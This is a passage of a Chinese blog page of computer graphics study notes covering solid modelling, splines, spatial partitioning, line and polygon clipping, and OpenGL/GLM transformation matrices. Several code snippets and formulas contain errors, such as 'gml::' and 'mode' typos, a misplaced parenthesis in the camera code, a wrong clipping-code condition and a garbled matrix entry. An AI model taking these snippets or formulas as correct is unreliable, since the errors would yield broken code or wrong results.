class="keyword">else</span>&#123;</span><br><span class="line">            x++; y++; e-=m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">SetPixel</span>(x, y, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="造型技术"><a href="#造型技术" class="headerlink" title="造型技术"></a>造型技术</h2><p>图形对象</p>
<ul>
<li>非图形信息：线型，颜色，体积，重量等</li>
<li>图形信息：点线面之间的关系，几何尺寸</li>
<li>几何信息：位置大小</li>
<li>拓扑信息：点边面等</li>
</ul>
<p>图形的基本元素：体，面，环，边，顶点</p>
<p>顶点：0维度几何元素。</p>
<p>边：一维几何元素。可以是直线或曲线。</p>
<p>环：二维几何元素。外环一般为逆时针，内环一般为顺时针。</p>
<p>面：二维几何元素。必须有一个外环，可以没有内环。面有方向，用外法线表示。可以是平面或曲面。</p>
<p>体：三维几何元素。由封闭的表面围成。边界是有限面的并集。</p>
<p>几何造型：通过点线面体等几何元素经过平移，缩放，旋转和并，交，差等集合运算产生的物体模型。</p>
<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体的性质：<br>刚性：必须有一定的形状。<br>维数一致性：一个物体的各部分是三维的。<br>占据优先空间：体积有限。<br>边界的确定性：能够区分出物体的内部和外部。<br>封闭性：经过任意计算后，仍然是有效物体。</p>
<p>实体的表面性质：<br>连通性：物体表面上任意两点可用实体表面上的一条路径连接。<br>有界性：物体表面可将空间分为互不连通的两部分，其中一部分是有界的。<br>非自相交性：物体表面不可自相交。<br>可定向性：表面的两侧可以明确定义出属于物体的内侧与外侧。<br>闭合性：由表面上的多边形网格各元素的拓扑关系决定。</p>
<p>克莱因瓶和莫比乌斯环则不符合上述性质。</p>
<p>正则形体：<br>三维空间中的正则集就是正则形体；<br>三维物体由内部点和边界点两部分， <strong>内部点</strong> 构成的点集的 <strong>闭包</strong> 就是正则集。</p>
<p>二维流形：<br>对于实体表面上任意一点，在其任意小的领域内，该领域与平面上的圆盘是拓扑等价的。</p>
<p>实体：正则形体 + 二维流形</p>
<p>欧拉公式： <code>V - E + F = 2</code>（顶点 - 边 + 面 &#x3D; 2）</p>
<p>欧拉公式适用于简单多面体（没有孔）。</p>
<p>对于非简单多面体：<code>V - E + F  - H = 2 * ( C - G )</code>（顶点 - 边 + 面 - 孔 &#x3D; 2 * （独立不相连多面体 - 贯穿孔））</p>
<h3 id="样条"><a href="#样条" class="headerlink" title="样条"></a>样条</h3><p>样条曲线：多项式曲线段连接的曲线。</p>
<p>样条曲面：由两组样条曲线描述。</p>
<p>插值样条曲线：选取适当的多项式让曲线经过每个控制点。</p>
<p>逼近样条曲线：选取多项式使部分或全部控制点不在生成的曲线上。</p>
<p>凸壳：包含一组控制点的凸多边形边界，是裁剪曲线的边界。</p>
<p>曲线控制图：由控制点连线构成的折线。</p>
<p>样条的描述方式：参数方程。</p>
<p>$$<br>x&#x3D;x(u)<br>y&#x3D;y(u)<br>z&#x3D;z(u)<br>$$</p>
<p>在分段处还要给定连续性条件。<br>0阶参数连续性(C0连续性)：简单表示相连。<br>1阶参数连续性(C1连续性)：相连处一阶导数相等。<br>2阶参数连续性(C2连续性)：相连处一阶和二阶导数相等。</p>
<p>几何连续性：相怜处参数导数成正比。<br>0阶几何连续性(G0连续性)：简单表示相连。<br>1阶几何连续性(G1连续性)：相连处一阶导数成比例。<br>2阶几何连续性(G2连续性)：相连处一阶和二阶导数成比例。</p>
<p>样条表示：</p>
<ol>
<li><code>x(u) = ax*u^3 + bx*u^2 + cx*u^1 + dx, 0 &lt;= u &lt;= 1</code></li>
<li><code>x(u) = [u^3 u^2 u^1 1] * [ax bx cx dx]^T = U * C</code><br><code>C = Mspline * Mgemo</code><br>Mgemo：四元素列矩阵，包含控制点的坐标和几何约束（边界条件）<br>Mspline：4x4矩阵，几何约束值转化为多项式系数，提供样条曲线的特征。</li>
<li>x(u) &#x3D; <code>g0 * BF0(u) + g1 * BF1(u) + ... + gk * BFk(u)</code><br>gK：约束参数，控制点坐标和控制点曲线斜率。<br>BFk(u)：混合函数，基本函数。</li>
</ol>
<p>样条曲面：<br><code>P(u, v) = sum(P(ku,kv) * BF(ku)(u) * BF(kv)(v))</code></p>
<p>Bezier 曲线：<br>控制点，共n+1个，k从0到n：<code>P[k] = (x[k], y[k], z[k])</code><br>函数路径：<code>p(u) = sum(P[k] * BEZ[k,n] (u))</code><br><code>BEZ[k,n] (u)</code>：Bernstein多项式：<code>= C(n,k) * u^k * (1-u)^(n-k)</code><br><code>C(n,k)</code>：二项式系数</p>
<p>Bezier 曲面：<br>由两组正交的Bezier曲线生成。<br><code>p(u,v) = sum_i( sum_j( P[i,j] * BEN[i,m] (u) * BEN[j,n] (v) ) )</code></p>
<h3 id="模型表示"><a href="#模型表示" class="headerlink" title="模型表示"></a>模型表示</h3><p>边界表示：用一组曲面描述物体</p>
<p>构造实体几何：使用基本实体运算得到</p>
<p>空间分割表示：描述物体的内部性质，由连续立方体堆叠成。</p>
<h4 id="边界表示"><a href="#边界表示" class="headerlink" title="边界表示"></a>边界表示</h4><p>多边形表面模型。</p>
<ul>
<li>数据结构：</li>
<li>几何信息：<ul>
<li>顶点表</li>
<li>边表</li>
<li>面表，方向：右手法则</li>
</ul>
</li>
<li>拓扑信息：<ul>
<li>翼边结构</li>
</ul>
</li>
<li>属性信息：<ul>
<li>透明度</li>
<li>材质</li>
<li>纹理</li>
</ul>
</li>
</ul>
<p>多边形网络<br>曲面边界：三角形带，四边形网格。</p>
<p>扫描表示：<br>最终结果也是多边形表面模型。</p>
<h4 id="构造实体表示"><a href="#构造实体表示" class="headerlink" title="构造实体表示"></a>构造实体表示</h4><p>集合运算过程，可以用一个二叉树描述（CSG树）</p>
<ul>
<li>叶子：对象</li>
<li>非叶子：操作</li>
<li>根：CSG对象</li>
</ul>
<p>通过光线投射算法，不必求解实体边界，可以快速实现光栅显示。</p>
<h4 id="空间位置分割表示"><a href="#空间位置分割表示" class="headerlink" title="空间位置分割表示"></a>空间位置分割表示</h4><p>使用三维数组<code>P[I][J][K]</code>表示物体空间占用情况。</p>
<p>使用八叉树表示实体，每个节点数据结构为：<br>01234567<br>BBBBBBBB<br>EBFBEBFE</p>
<p>E：Empty，空<br>F：Full，满<br>B：Boundary，边界</p>
<p>首先将整个空间分为8块，一个节点表示一个块。再将每个块细分为8个子块，每个子节点表示一个子块，如此细分下去，直到满足精度要求，如果是空或满则不必细分。</p>
<p>松散八叉树。</p>
<p>二叉空间分割，BSP树。每次将一个实体分为两半，方向任意。可以自适应分割，减少搜索时间。</p>
<p>BSP树：</p>
<ul>
<li>轴对齐分割：选取一个轴，将空间一分为二。</li>
<li>多边形对齐分割。非常耗时。可以严格从前从后遍历。</li>
</ul>
<p>BSP树可以用于碰撞检测。</p>
<h3 id="分形"><a href="#分形" class="headerlink" title="分形"></a>分形</h3><p>特点：</p>
<ul>
<li>不规则</li>
<li>自相似</li>
</ul>
<p>分形维数：把原图缩小为<code>1/a</code>的相似的<code>b</code>个图形，则有<code>a^D=b</code>。<code>D</code> 就是分形维数，可以是整数或分数。</p>
<p>生成过程：初试生成元，生成元。</p>
<p>例如：谢尔宾斯基三角形，科赫Koch雪花曲线。</p>
<p>形状语法：给定一组产生式规则，设计者可以根据规则获取物体。<br>例如：<br>L 语法：</p>
<ul>
<li>几何解释：<ul>
<li>F 向前画线</li>
<li>右转60°</li>
<li>左转60°</li>
</ul>
</li>
</ul>
<h3 id="粒子系统"><a href="#粒子系统" class="headerlink" title="粒子系统"></a>粒子系统</h3><p>用于模拟：水流，火，烟尘，爆炸，云雾，雪，流星，树叶等。</p>
<p>微粒系统：一组分散的微小物体集合，大小和形状可随时间变化。</p>
<p>模拟方式：</p>
<ul>
<li>随机过程模拟</li>
<li>运动路径模拟</li>
<li>力学模拟</li>
</ul>
<p>两要素：</p>
<ul>
<li>造型</li>
<li>运动方式</li>
</ul>
<p>两过程：</p>
<ul>
<li>模拟</li>
<li>渲染</li>
</ul>
<p>粒子有生命值，要有产生和消亡过程。因此基本属性包括：位置，速度，颜色，大小，生命值。</p>
<p>公告板技术：粒子始终面向摄像机方向。</p>
<h2 id="几何阶段"><a href="#几何阶段" class="headerlink" title="几何阶段"></a>几何阶段</h2><p>过程：</p>
<p>建模坐标系：局部空间<br>模型变换<br>世界坐标系：世界空间<br>视图变换<br>观察坐标系：观察空间<br>投影变换<br>观察坐标系：裁剪空间<br>屏幕映射<br>屏幕坐标系：屏幕空间</p>
<h3 id="裁剪"><a href="#裁剪" class="headerlink" title="裁剪"></a>裁剪</h3><p>保留观察空间内的物体。</p>
<p>物体与窗口关系：</p>
<ul>
<li>窗口内，保留。</li>
<li>窗口外，舍弃。</li>
<li>窗口上，计算交点判断。</li>
</ul>
<h4 id="基于编码的剪裁方式"><a href="#基于编码的剪裁方式" class="headerlink" title="基于编码的剪裁方式"></a>基于编码的剪裁方式</h4><p>Cohen-Sutherland方法：基于编码的剪裁方式。（二维平面，直线段）</p>
<ul>
<li>简取：两点都在窗口内部。</li>
<li>简弃：两点都在窗口外部。如果两点都在上面（或下面，或左边，或右边）则弃。</li>
<li>其他情况：将线段按交点分段，之后重复上述过程。</li>
</ul>
<p>为每一个点赋予一个二进制编码<code>D3 D2 D1 D0</code>。</p>
<ul>
<li>x &lt; wxl：D0 &#x3D; 1 否则 D0 &#x3D; 0</li>
<li>x &gt; wxr：D1 &#x3D; 1 否则 D1 &#x3D; 0</li>
<li>y &lt; wyb：D2 &#x3D; 1 否则 D2 &#x3D; 0</li>
<li>y &lt; wyt：D3 &#x3D; 1 否则 D3 &#x3D; 0</li>
</ul>
<p>则wxl wxr wyb wyt所切割的平面被划分为9个区域，每个区域有一个独立的编码。</p>
<p>计算两个端点的编码<code>code_1</code>和<code>code_2</code>：</p>
<ul>
<li>code_1|code_2 &#x3D; 0：简取</li>
<li>code_1&amp;code_2 !&#x3D; 0：简弃</li>
<li>其他情况，求出交点再考虑。</li>
</ul>
<p>中点剪裁法：在其他情况中，不再求交点，而是将线二等分再重复上述过程。</p>
<p>使用情况：大窗口，特小窗口。</p>
<h4 id="Liang-Barsky-剪裁算法"><a href="#Liang-Barsky-剪裁算法" class="headerlink" title="Liang-Barsky 剪裁算法"></a>Liang-Barsky 剪裁算法</h4><p>首先对线段赋予方向，对任意直线段：IJ 有参数方程<br><code>x = x1 + u * (x2 - x1)</code><br><code>y = y1 + u * (y2 - y1)</code></p>
<p>如果在窗口内则有：<br><code>wxl &lt;= x &lt;= wxr</code><br><code>wyb &lt;= y &lt;= wyt</code></p>
<p>令<code>p1 = x1 - x2</code> , <code>q1 = x1 - wxl</code> …<br>则<code>u * pk &lt;= qk , k = 1, 2, 3, 4</code>  （左，右，下，上）</p>
<p>起点：<code>Uone = max(0, u[k|pk &lt; 0], u[k|pk &lt; 0])</code><br>终点：<code>Utwo = min(1, u[k|pk &gt; 0], u[k|pk &gt; 0])</code></p>
<p>最终得到直线的开始点和结束点，经过过滤不符合逻辑的线段，处理垂直和水平的线段后得到裁剪的线段。</p>
<h4 id="多边形裁剪"><a href="#多边形裁剪" class="headerlink" title="多边形裁剪"></a>多边形裁剪</h4><p>Sutherland-Hodgeman 逐边裁剪算法，按窗口的左下右上的方法切割多边形，修改多边形的输出顶点。对于凹多边形有缺陷。</p>
<p>Weiler-Atherton 算法，按顺时针方向沿多边形边界追踪每一条边，记录每次穿过窗口的点。当从不可见进入可见区域，则输出可见线段。当从可见进入不可见区域，则沿窗口边界顺时针找到另外一个交点，输出两点间的线段。</p>
<p>Cohen-Sutherland 推广到三维：使用6位编码，分割空间为9个部分。</p>
<p>Liang-Barsky 推广到三维：之前是6个候选点，现在是8个候选点。</p>
<p>Sutherland-Hodgeman 推广到三维：裁剪三角形。</p>
<h3 id="屏幕映射"><a href="#屏幕映射" class="headerlink" title="屏幕映射"></a>屏幕映射</h3><p>由裁剪空间进入屏幕映射，坐标系由右手系变为左手系，这时z轴的方向反向。</p>
<p>z轴上的映射关系是：<br>裁剪空间：<code>z=1</code>  -&gt; 屏幕空间：<code>z&#39;=0</code><br>裁剪空间：<code>z=0</code>  -&gt; 屏幕空间：<code>z&#39;=0.5</code><br>裁剪空间：<code>z=-1</code> -&gt; 屏幕空间：<code>z&#39;=1</code></p>
<p><code>z&#39; = (1-z)/2 + 0</code></p>
<p>这部分由GPU完成。</p>
<h3 id="模型变换"><a href="#模型变换" class="headerlink" title="模型变换"></a>模型变换</h3><p>在OpenGL中使用模型矩阵model实现。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">glm::mat4 <span class="title">model</span><span class="params">(<span class="number">1</span>)</span></span>;  <span class="comment">// 创建模型</span></span><br><span class="line">model = gml::<span class="built_in">translate</span>(mode, glm::<span class="built_in">vec3</span>(<span class="number">0.0f</span>, <span class="number">0.0f</span>, <span class="number">-3.0f</span>));  <span class="comment">// 平移</span></span><br><span class="line">model = gml::<span class="built_in">rotate</span>(mode, (<span class="type">float</span>)<span class="built_in">glfGetTime</span>(), glm::<span class="built_in">vec3</span>(<span class="number">0.0f</span>, <span class="number">1.0f</span>, <span class="number">0.0f</span>));  <span class="comment">// 旋转</span></span><br><span class="line">model = gml::<span class="built_in">scale</span>(mode, glm::<span class="built_in">vec3</span>(<span class="number">0.5f</span>, <span class="number">0.5f</span>, <span class="number">0.5f</span>));  <span class="comment">// 缩放</span></span><br></pre></td></tr></table></figure>


<h3 id="视图变换"><a href="#视图变换" class="headerlink" title="视图变换"></a>视图变换</h3><p>在OpenGL使用视图矩阵实现。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">glm::mat4 <span class="title">view</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="comment">// 摄像机的位置，目标位置Zv，上方向量Yv，坐标系符合右手定则</span></span><br><span class="line">view = glm::<span class="built_in">lookAt</span>(camera_pos, camera_pos + camera_font, camera_up);</span><br></pre></td></tr></table></figure>


<h3 id="投影变换"><a href="#投影变换" class="headerlink" title="投影变换"></a>投影变换</h3><p>在OpenGL使用视图矩阵projection实现。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">glm::mat4 proj = glm::<span class="built_in">perspective</span>(</span><br><span class="line">    <span class="number">45.0f</span>,   <span class="comment">// 视野的角度 fov</span></span><br><span class="line">    (<span class="type">float</span>)width/(<span class="type">float</span>)height,  <span class="comment">// 视窗的宽高比</span></span><br><span class="line">    <span class="number">0.1f</span>,    <span class="comment">// 前截面</span></span><br><span class="line">    <span class="number">100.0f</span>   <span class="comment">// 后截面</span></span><br><span class="line">);  </span><br></pre></td></tr></table></figure>

<h3 id="PVM-矩阵"><a href="#PVM-矩阵" class="headerlink" title="PVM 矩阵"></a>PVM 矩阵</h3><p>将Model，View，Projection合并为PVM矩阵。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">gl_Pos = projection * view * model * <span class="built_in">vec4</span>(aPos, <span class="number">1.0f</span>);  <span class="comment">// 顺序不能出错，计算从右向左</span></span><br></pre></td></tr></table></figure>

<p>在OpenGL中，向量都是列矩阵，而之前的理论推导均为行矩阵，因此需要倒过来计算。</p>
<h3 id="旋转立方体"><a href="#旋转立方体" class="headerlink" title="旋转立方体"></a>旋转立方体</h3><p>模型设置：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建模型</span></span><br><span class="line"><span class="function">glm::mat4 <span class="title">model</span><span class="params">(<span class="number">1</span>)</span></span>; <span class="comment">// 局部坐标转换到世界坐标</span></span><br><span class="line"><span class="comment">// 平移旋转模型</span></span><br><span class="line">model = glm::<span class="built_in">translate</span>(model, glm::<span class="built_in">vec3</span>(<span class="number">0.0f</span>, <span class="number">0.0f</span>, <span class="number">0.0f</span>));</span><br><span class="line">model = glm::<span class="built_in">rotate</span>(</span><br><span class="line">    model, </span><br><span class="line">    (<span class="type">float</span>)<span class="built_in">glfwGetTime</span>(),  <span class="comment">// 以当前时间作为旋转角度</span></span><br><span class="line">    glm::<span class="built_in">vec3</span>(<span class="number">0.5f</span>, <span class="number">1.0f</span>, <span class="number">0.0f</span>)  <span class="comment">// 旋转轴</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// 观察矩阵</span></span><br><span class="line"><span class="function">glm::mat4 <span class="title">view</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">view = glm::<span class="built_in">lookAt</span>(camera_pos, camera_pos + camera_font, camera_up);</span><br><span class="line"><span class="comment">// 投影矩阵</span></span><br><span class="line">glm::mat4 projection = glm::<span class="built_in">perspective</span>(</span><br><span class="line">    glm::<span class="built_in">radians</span>(fov),   <span class="comment">// 视野的角度 fov</span></span><br><span class="line">    (<span class="type">float</span>)screen_width/(<span class="type">float</span>)screen_height,  <span class="comment">// 视窗的宽高比</span></span><br><span class="line">    <span class="number">0.1f</span>,    <span class="comment">// 前截面</span></span><br><span class="line">    <span class="number">100.0f</span>   <span class="comment">// 后截面</span></span><br><span class="line">);  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>摄像机控制：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 键盘事件</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ProcessInput</span><span class="params">(GLFWwindow *window)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ESC 关闭窗口</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">glfwGetKey</span>(window, GLFW_KEY_ESCAPE) == GLFW_PRESS)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">glfwSetWindowShouldClose</span>(window, <span class="literal">true</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 按 W 向前移动</span></span><br><span class="line">    <span class="type">float</span> camera_speed = <span class="number">2.5f</span> * delta_time;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">glfwGetKey</span>(window, GLFW_KEY_W) == GLFW_PRESS)&#123;</span><br><span class="line">        camera_pos += camera_speed * camera_front;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册鼠标相应</span></span><br><span class="line"><span class="built_in">glfwSetCursorPosCallback</span>(window, MouseCallback);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标事件</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MouseCallback</span><span class="params">(GLFWwindow *window, <span class="type">double</span> xpos, <span class="type">double</span> ypos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    glm::vec3 front;</span><br><span class="line">    front.x = <span class="built_in">cos</span>(glm::<span class="built_in">radians</span>(yaw) * <span class="built_in">cos</span>(glm::<span class="built_in">radians</span>(pitch)));</span><br><span class="line">    front.y = <span class="built_in">sin</span>(glm::<span class="built_in">radians</span>(pitch));</span><br><span class="line">    front.z = <span class="built_in">sin</span>(glm::<span class="built_in">radians</span>(yaw) * <span class="built_in">cos</span>(glm::<span class="built_in">radians</span>(pitch)));</span><br><span class="line">    camera_front = glm::<span class="built_in">normalize</span>(front);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将PVM传入着色器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取着色器内某个参数的位置</span></span><br><span class="line"><span class="type">int</span> model_location = <span class="built_in">glGetUniformLocation</span>(our_shader.ID, <span class="string">&quot;model&quot;</span>);</span><br><span class="line"><span class="comment">// 写入参数值</span></span><br><span class="line"><span class="built_in">glUniformMatrix4fv</span>(model_location, <span class="number">1</span>, GL_FALSE, glm::<span class="built_in">value_ptr</span>(model));</span><br></pre></td></tr></table></figure>

<p>开启深度测试：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">glEnable</span>(GL_DEPTH_TEST); <span class="comment">// 开启深度测试</span></span><br><span class="line"><span class="built_in">glDepthFunc</span>(GL_LESS);    <span class="comment">// 深度测试，输入的深度小于参考值则通过</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="几何变换"><a href="#几何变换" class="headerlink" title="几何变换"></a>几何变换</h3><h4 id="二维变换"><a href="#二维变换" class="headerlink" title="二维变换"></a>二维变换</h4><p>例如在二维空间下：</p>
<p>平移变换：<br><code>x&#39; = x + Tx</code><br><code>y&#39; = y + Ty</code></p>
<p>比例变换：<br><code>x&#39; = x * Sx</code><br><code>y&#39; = y * Sy</code></p>
<p>旋转变换：<br><code>x&#39; = r * cos(A + B)</code><br><code>y&#39; = r * sin(A + B)</code></p>
<p><code>x&#39; = x * cosA - y * sinA</code><br><code>y&#39; = x * sinA + y * cosA</code></p>
<p>对称变换：5种情况<br><code>x&#39; = x</code><br><code>y&#39; = -y</code></p>
<p>错切变换：<br><code>x&#39; = x + d * y</code><br><code>y&#39; = b * x + y</code></p>
<p>使用齐次坐标表达方式，可以用3维向量表示2维向量，来简化计算。例如：<code>p[x, y]</code> 表示为 <code>p[hx, hy, h]</code>，h为不为<code>0</code>的系数，规范化表示：令<code>h = 1</code>。</p>
<p>这样，就可以使用齐次坐标与变换矩阵相乘得到结果。</p>
<p>对于变换矩阵<br>左上部分(4)：图像的比例，旋转，对称，错切<br>右上部分(2)：投影<br>左下部分(2)：平移<br>右下部分(1)：整体的比例变换</p>
<p>平移变换：<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; 0 &amp; 0 \<br>   0 &amp; 1 &amp; 0 \<br>   Tx &amp; Ty &amp; 1<br>  \end{matrix}<br>  \right] \tag{1}<br>$$</p>
<p>比例变换：<br>$$<br> \left[<br> \begin{matrix}<br>   Sx &amp; 0 &amp; 0 \<br>   0 &amp; Sy &amp; 0 \<br>   0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{2}<br>$$</p>
<p>旋转变换：<br>$$<br> \left[<br> \begin{matrix}<br>   cosA &amp; sinA &amp; 0 \<br>   -sinA &amp; cosA &amp; 0 \<br>   0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{3}<br>$$</p>
<p>对称变换：5种情况<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; 0 &amp; 0 \<br>   0 &amp; -1 &amp; 0 \<br>   0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{4}<br>$$</p>
<p>错切变换：<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; b &amp; 0 \<br>   c &amp; 1 &amp; 0 \<br>   0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{5}<br>$$</p>
<p>运算完毕后，对齐次坐标进行规范化（最后一项<code>h</code>）。</p>
<h4 id="三维变换"><a href="#三维变换" class="headerlink" title="三维变换"></a>三维变换</h4><p>在3维空间中的齐次坐标表示为<code>p[hx, hy, hz, h]</code>，变换矩阵含义依然不变。</p>
<p>平移变换：<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; 0 &amp; 0 &amp; 0 \<br>   0 &amp; 1 &amp; 0 &amp; 0 \<br>   0 &amp; 0 &amp; 1 &amp; 0 \<br>   Tx &amp; Ty &amp; Tz &amp; 1<br>  \end{matrix}<br>  \right] \tag{6}<br>$$</p>
<p>比例变换：<br>$$<br> \left[<br> \begin{matrix}<br>   Sx &amp; 0 &amp; 0 &amp; 0 \<br>   0 &amp; Sy &amp; 0 &amp; 0 \<br>   0 &amp; 0 &amp; Sz &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{7}<br>$$</p>
<p>旋转变换（右手定则）：</p>
<p>绕<code>z</code>轴转动：<br>$$<br> \left[<br> \begin{matrix}<br>   cosA &amp; sinA &amp; 0 &amp; 0 \<br>   -sinA &amp; cosA &amp; 0 &amp; 0 \<br>   0 &amp; 0 &amp; 1 &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{8}<br>$$</p>
<p>绕<code>x</code>轴转动：<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; 0 &amp; 0 &amp; 0 \<br>   0 &amp; cosA &amp; sinA &amp; 0 \<br>   0 &amp; -sinA &amp; cosA &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{9}<br>$$</p>
<p>绕<code>y</code>轴转动：<br>$$<br> \left[<br> \begin{matrix}<br>   cosA &amp; 0 &amp; -sinA &amp; 0 \<br>   0 &amp; 1 &amp; 0 &amp; 0 \<br>   sinA &amp; 0 &amp; cosA &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{10}<br>$$</p>
<p>对称变换：<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; 0 &amp; 0 &amp; 0 \<br>   0 &amp; -1 &amp; 0 &amp; 0 \<br>   0 &amp; 0 &amp; 1 &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{11}<br>$$</p>
<p>错切变换：<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; b &amp; c &amp; 0 \<br>   d &amp; 1 &amp; f &amp; 0 \<br>   g &amp; h &amp; 1 &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{12}<br>$$</p>
<p>也就是<code>x&#39; = x + d*y + g*z</code></p>
<h4 id="三维逆变换"><a href="#三维逆变换" class="headerlink" title="三维逆变换"></a>三维逆变换</h4><p>平移变换：<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; 0 &amp; 0 &amp; 0 \<br>   0 &amp; 1 &amp; 0 &amp; 0 \<br>   0 &amp; 0 &amp; 1 &amp; 0 \<br>   -Tx &amp; -Ty &amp; -Tz &amp; 1<br>  \end{matrix}<br>  \right] \tag{6}<br>$$</p>
<p>比例变换：<br>$$<br> \left[<br> \begin{matrix}<br>   1&#x2F;Sx &amp; 0 &amp; 0 &amp; 0 \<br>   0 &amp; 1&#x2F;Sy &amp; 0 &amp; 0 \<br>   0 &amp; 0 &amp; 1&#x2F;Sz &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{7}<br>$$</p>
<p>旋转变换（右手定则）（带入 -A）：</p>
<p>绕<code>z</code>轴转动：<br>$$<br> \left[<br> \begin{matrix}<br>   cosA &amp; -sinA &amp; 0 &amp; 0 \<br>   -inA &amp; cosA &amp; 0 &amp; 0 \<br>   0 &amp; 0 &amp; 1 &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{8}<br>$$</p>
<p>绕<code>x</code>轴转动：<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; 0 &amp; 0 &amp; 0 \<br>   0 &amp; cosA &amp; -sinA &amp; 0 \<br>   0 &amp; sinA &amp; cosA &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{9}<br>$$</p>
<p>绕<code>y</code>轴转动：<br>$$<br> \left[<br> \begin{matrix}<br>   cosA &amp; 0 &amp; sinA &amp; 0 \<br>   0 &amp; 1 &amp; 0 &amp; 0 \<br>   -sinA &amp; 0 &amp; cosA &amp; 0 \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{10}<br>$$</p>
<h4 id="三维复合变换"><a href="#三维复合变换" class="headerlink" title="三维复合变换"></a>三维复合变换</h4><p>分析步骤：</p>
<ol>
<li>先将参考点移动到坐标原点（轴）</li>
<li>进行相应变换</li>
<li>在移动到原来位置</li>
</ol>
<h3 id="观察变换"><a href="#观察变换" class="headerlink" title="观察变换"></a>观察变换</h3><p>设观察参考点<code>P0[Xv, Yv, Zv]</code>，观察坐标系为右手定则。</p>
<p>观察变换：将世界坐标系中的点<code>Q</code>变换到观察坐标系中。</p>
<p>分析步骤：</p>
<ol>
<li>平移观察参考点到用户坐标系原点</li>
<li>进行旋转变换，将三个坐标轴重合</li>
<li>此时新得到的<code>Q</code>就是所求了</li>
</ol>
<h3 id="投影变换-1"><a href="#投影变换-1" class="headerlink" title="投影变换"></a>投影变换</h3><p>在观察变换中隐含了一个观察平面，也就是投影平面。</p>
<p>平行投影：三视图</p>
<ul>
<li>正投影</li>
<li>三视图：常用反应尺寸，但难以表达三维性质</li>
<li>正轴测图：垂直投影方向</li>
<li>等轴测，正二测，正三测</li>
<li>斜投影：投影方向不垂直与投影面</li>
<li>斜等测，斜二测</li>
</ul>
<p>透视投影：近大远小<br>一点透视：1个主灭点，投影面与1个坐标轴正交，与另外2个轴平行<br>两点透视：2个主灭点，投影面与2个坐标轴正交，与另外1个轴平行<br>三点透视：3个主灭点，与3个坐标轴都相交</p>
<p>在变换矩阵的右上角，是有关投影的设置。<br>一点透视：相似成比例<br>x’ &#x3D; x &#x2F; (z&#x2F;d)<br>y’ &#x3D; y &#x2F; (z&#x2F;d)<br>z’ &#x3D; d</p>
<p>变换矩阵：<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; 0 &amp; 0 &amp; 0 \<br>   0 &amp; 1 &amp; 0 &amp; 0 \<br>   0 &amp; 0 &amp; 1 &amp; 1&#x2F;d \<br>   0 &amp; 0 &amp; 0 &amp; 1<br>  \end{matrix}<br>  \right] \tag{10}<br>$$</p>
<h3 id="观察空间"><a href="#观察空间" class="headerlink" title="观察空间"></a>观察空间</h3><p>根据观察平面可以定义观察空间，根据投影方式不同，会产生出不同的形状观察空间。根据前截面和后截面的定义，还能得到观察空间的范围。</p>
